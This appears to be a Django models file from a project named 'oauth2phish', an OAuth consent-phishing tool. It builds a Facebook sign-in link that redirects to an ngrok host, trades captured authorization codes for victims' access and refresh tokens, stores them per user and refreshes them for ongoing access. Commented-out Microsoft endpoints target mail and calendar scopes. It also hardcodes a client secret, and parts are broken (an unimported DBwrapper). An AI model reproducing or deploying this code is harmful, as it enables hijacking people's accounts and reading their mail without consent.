from django.db import models
from oauth2phish.db import DBconn
from urllib.parse import quote, urlencode
import requests
import time
import uuid
import json
# Create your models here.

class Auth(models.Model):
    scopes = ['openid',
              'offline_access',
              'User.Read',
              'Mail.Read',
              'Calendars.Read']

    client_id = '1667499663318816'
    client_secret = '633d0c654c590f699b7c6e6422264ddc'

    #authority = 'https://login.microsoftonline.com'
    authority = 'https://www.facebook.com/dialog/oauth'
    authorize_url = '{0}{1}'.format(authority,'/?{0}')#'{0}{1}'.format(authority, '/common/oauth2/v2.0/authorize?{0}')
    #token_url = '{0}{1}'.format(authority, '/common/oauth2/v2.0/token')
    redirect_uri = 'https://7cf8aafc.ngrok.io/facebook/gettoken'
    token_url = 'https://graph.facebook.com/oauth/access_token'




    def get_signin_url(redirect_uri):
     #   DBconn.connectDB()
      # Build the query parameters for the signin url
        params = { 'client_id': Auth.client_id,
                 'redirect_uri': redirect_uri,
                 'response_type': 'code'#,
                # 'scope': ' '.join(str(i) for i in Auth.scopes)
                }
        signin_url = Auth.authorize_url.format(urlencode(params))
        return signin_url


    def get_token_from_code(auth_code, redirect_uri):
      # Build the post form for the token request
        post_data = { 'grant_type': 'authorization_code',
                    'code': auth_code,
                    'redirect_uri': redirect_uri,
                    'scope': ' '.join(str(i) for i in Auth.scopes),
                    'client_id': Auth.client_id,
                    'client_secret': Auth.client_secret
                  }
        r = requests.post(Auth.token_url, data = post_data)
        try:
            return r.json()
        except:
            return 'Error retrieving token: {0} - {1}'.format(r.status_code, r.text)

    def get_token_from_refresh_token(refresh_token, redirect_uri):
        # Build the post form for the token request
        post_data = { 'grant_type': 'refresh_token',
                    'refresh_token': refresh_token,
                    'redirect_uri': redirect_uri,
                    'scope': ' '.join(str(i) for i in Auth.scopes),
                    'client_id': Auth.client_id,
                    'client_secret': Auth.client_secret
                  }
        r = requests.post(Auth.token_url, data = post_data)
        try:
            return r.json()
        except:
            return 'Error retrieving token: {0} - {1}'.format(r.status_code, r.text)


    def get_access_token(request, redirect_uri):
        DBconn.connectDB()

        user_id = request.session["user_id"]
        if user_id:
            record = DBwrapper.getRecordFromOffice(user_id)
            current_token = record[0][4]
            refresh_token = record[0][5]
            expiration    = record[0][6]

            now = int(time.time())
            if (current_token and now < expiration):
                # Token still valid
                return current_token
            else:
                # Token expired
                #refresh_token = request.session['refresh_token']

                new_tokens = Auth.get_token_from_refresh_token(refresh_token, redirect_uri)
                expiration = int(time.time()) + new_tokens['expires_in'] - 300
                DBwrapper.refreshTokenOffice(user_id, new_tokens['access_token'],
                                             new_tokens['refresh_token'], expiration)

                # Save the token in the session
                request.session['access_token'] = new_tokens['access_token']
                request.session['refresh_token'] = new_tokens['refresh_token']
                request.session['token_expires'] = expiration


                return new_tokens['access_token']
        else:
            return 0
